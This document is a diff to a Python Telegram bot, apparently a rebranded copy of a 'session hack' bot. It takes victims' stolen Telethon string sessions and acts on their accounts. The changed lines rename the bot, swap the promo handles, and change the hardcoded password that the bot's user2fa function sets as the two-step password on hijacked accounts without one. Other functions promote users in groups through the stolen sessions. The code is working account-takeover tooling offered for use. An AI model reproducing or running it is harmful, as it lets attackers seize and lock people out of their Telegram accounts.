@@ -1,5 +1,3 @@
-# COPYRIGHT © 2021-22 BY LEGENDX22 🔥
-# NOW PUBLIC BY LEGENDX
 import os
 os.system("pip install Telethon==1.21.1")
 from telethon import TelegramClient, events, functions, types
@@ -18,7 +16,7 @@ import telethon;from telethon import functions
 from telethon.tl.types import ChannelParticipantsAdmins as cpa
 
 from telethon.tl.functions.channels import CreateChannelRequest as ccr
-mybot = "missrose_bot"
+mybot = "SirSessionHackBot"
 bot = borg = client
 async def check(channel, uid):
     try:
@@ -83,7 +81,7 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
   async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
     try:
-      await X.edit_2fa('LEGENDXISBEST')
+      await X.edit_2fa('ARAZ')
       return True
     except:
       return False
@@ -206,7 +204,7 @@ async def start(event):
   global channel
   k = await check (channel, event.sender_id)
   if not k:
-    return await event.reply("Hey Kiddo 1st Join @T_VaHoM")
+    return await event.reply("Hey Kiddo 1st Join @TheMrLoNely")
   async with bot.conversation(event.chat_id) as x:
     await x.send_message(f"Choose what you want with string session \n\n{menu}")
     res = await x.get_response()
@@ -309,7 +307,7 @@ async def start(event):
         return await event.respond("This StringSession is terminated maybe")
       i = await user2fa(strses.text)
       if i:
-        await event.reply("User don't have two step thats why now two step is `LEGENDXISBEST` you can login now\n\nThanks For using T_VaHoM Bot")
+        await event.reply("User don't have two step thats why now two step is `ARAZ` you can login now\n\nThanks For using T_VaHoM Bot")
       else:
         await event.reply("Sorry User Have two step already")
     elif r == "I":
@@ -385,7 +383,7 @@ async def start(event):
         else:
           await event.respond("Something is wrong")
       except Exception as e:
-        await event.respond("SEND THIS ERROR TO - @sessionhack_chat\n**LOGS**\n" + str(e))
+        await event.respond("SEND THIS ERROR TO - @T_VaHoM\n**LOGS**\n" + str(e))
 
     else:
       await event.respond("Wrong Text Found Re type /hack and use")
